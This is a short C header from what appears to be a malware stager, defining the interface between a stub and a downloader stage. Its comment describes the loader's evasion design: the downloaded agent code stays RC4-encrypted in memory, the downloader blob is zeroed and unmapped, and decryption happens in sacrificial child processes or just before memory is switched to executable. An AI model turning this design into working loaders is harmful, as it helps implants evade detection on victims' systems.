#ifndef STAGER_STAGE_ABI_H
#define STAGER_STAGE_ABI_H

#include <stddef.h>
#include <stdint.h>

#include "packer.h"

/*
 * ABI between the stager stub and the downloader stage.
 *
 * The downloader runs from a separate, position-independent blob that the
 * stub maps, runs, then zeroes and unmaps. It returns the agent PIC still
 * RC4-encrypted (read/write) plus the key to decrypt it; the stub owns that
 * mapping for the whole lifecycle.
 *
 * Decryption is deliberately deferred to whoever runs the PIC. With SUPERVISE
 * the parent keeps only ciphertext RW: each sacrificial child decrypts the
 * shared pages into its own RX view (copy-on-write), runs, and tears it down
 * on exit. Without SUPERVISE the single stub process decrypts in place and
 * flips to RX just before entering the payload.
 */
struct download_result {
  char *data;   /* downloaded agent PIC, still RC4-encrypted (RW mmap) */
  size_t size;  /* number of valid bytes in data */
  uint8_t key[DERIVED_KEY_LEN]; /* RC4 key for data */
};

#endif /* STAGER_STAGE_ABI_H */
